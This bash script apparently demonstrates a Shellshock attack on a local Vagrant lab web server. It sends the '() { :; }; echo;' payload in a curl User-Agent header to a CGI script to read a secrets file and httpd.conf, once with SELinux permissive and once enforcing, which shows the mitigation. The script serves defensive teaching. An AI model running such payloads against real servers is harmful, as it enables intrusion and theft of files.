#!/bin/bash

URL="http://web.vm.local"
SHELL_SCRIPT="${URL}/cgi-bin/shellshock.cgi"

BLUE='\033[0;34m'   # "Continue?" prompt
GREEN='\033[0;32m'  # Script info logs
NC='\033[0m'        # No Color

# Handle CTRL-C
function ctrl_c() {
    echo -e "${NC}"
    vagrant ssh web -c "sudo setenforce 1" 2> /dev/null
    exit 0
}
trap ctrl_c INT

function wait_to_continue() {
    # Wait to continue
    echo -ne "${BLUE}"
    read -p "Continue? " trash
    echo -ne "${NC}"
}

function info_log() {
    echo -e "${GREEN}$@${NC}"
}

function echo_cmd() {
    # Print and execute command
    (set -x; "$@")

    wait_to_continue
}

function exploit() {
    BASE_PAYLOAD="() { :; }; echo;"

    echo_cmd curl -A "${BASE_PAYLOAD} /bin/cat /home/vagrant/secrets.txt" ${SHELL_SCRIPT}
    echo_cmd curl -A "${BASE_PAYLOAD} /bin/head -n8 /etc/httpd/conf/httpd.conf" ${SHELL_SCRIPT}
}

info_log "From the webserver, run the command:"
info_log "sudo tail -n0 -f /var/log/audit/audit.log | grep shellshock$"
wait_to_continue

# Show webserver is running
echo_cmd curl "${URL}"
echo_cmd curl "${SHELL_SCRIPT}"

# Set SELinux to permissive mode
cd vagrant
info_log "Setting SELinux to permissive mode"
vagrant ssh web -c "sudo setenforce 0" 2> /dev/null

exploit

# Set SELinux to enforcing mode
info_log "Setting SELinux to enforcing mode"
vagrant ssh web -c "sudo setenforce 1" 2> /dev/null

exploit

cd ..
info_log "Finished"
